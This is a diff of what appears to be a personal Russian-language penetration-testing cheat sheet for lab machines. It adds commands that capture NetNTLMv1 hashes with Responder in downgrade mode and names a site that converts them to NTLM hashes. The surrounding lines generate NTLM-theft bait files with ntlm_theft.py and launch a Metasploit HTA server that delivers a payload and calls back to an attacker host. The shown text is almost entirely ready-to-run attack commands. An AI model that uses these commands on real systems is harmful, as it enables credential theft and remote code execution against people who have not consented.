@@ -1902,6 +1902,12 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	cd ntlm_theft
 	python3 ntlm_theft.py -g htm -s <my_ip> -f student
 	sudo responder -I tun0 
+
+Поймать хешь netntlmv1
+
+		sudo responder -I eth0 --lm --disable-ess -v
+		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
+		
 # Произвольное выполнение файла
 
 	msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j" 
